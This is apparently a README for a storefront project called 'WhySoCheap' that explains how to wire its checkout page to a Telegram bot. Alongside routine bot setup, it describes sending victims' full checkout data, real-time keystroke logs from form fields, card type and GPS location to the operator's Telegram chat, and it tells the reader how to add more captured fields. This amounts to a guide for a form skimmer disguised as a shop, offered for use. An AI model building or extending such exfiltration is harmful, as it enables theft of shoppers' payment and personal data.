# Telegram Bot Setup Instructions

## 1. Create a Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Choose a name for your bot (e.g., "WhySoCheap Bot")
4. Choose a username for your bot (e.g., "whysocheap_bot")
5. Copy the bot token that BotFather gives you

## 2. Get Your Chat ID

1. Start a conversation with your bot
2. Send any message to the bot
3. Open this URL in your browser (replace YOUR_BOT_TOKEN with your actual token):
   ```
   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
   ```
4. Look for the "chat" object and copy the "id" value (this is your chat ID)

## 3. Set Environment Variables

Create a `.env.local` file in your project root with:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

## 4. Test the Integration

1. Start your development server: `npm run dev`
2. Go to the checkout page and fill out the form
3. Submit the form
4. Check your Telegram chat - you should receive a notification with customer data

## 5. What Gets Sent to Telegram

The bot will send notifications for:
- **Customer Data**: Complete customer information when they submit the checkout form
- **Keylogs**: Real-time typing behavior in form fields
- **Card Type**: Which credit card type they selected
- **Location Data**: GPS coordinates if available
- **Order Notifications**: When orders are placed

## 6. Adding More Data Fields

To add more fields to track:

1. Add the field to the `CustomerData` interface in `src/lib/telegramService.ts`
2. Add the field to the form data in `src/app/checkout/page.tsx`
3. Include the field in the `logCustomerData` function
4. Update the `formatCustomerData` function to display the new field

Example:
```typescript
// In telegramService.ts
interface CustomerData {
  // ... existing fields
  newField?: string
}

// In formatCustomerData function
const newField = data.newField ? `🆕 New Field: ${data.newField}` : '🆕 New Field: Not provided'
```

## 7. Troubleshooting

- **Bot not responding**: Check that the bot token and chat ID are correct
- **No notifications**: Check the browser console for errors
- **Missing data**: Ensure all form fields are properly included in the logging function

## 8. Security Notes

- Never commit your `.env.local` file to version control
- Keep your bot token secret
- Consider using environment-specific chat IDs for different deployments
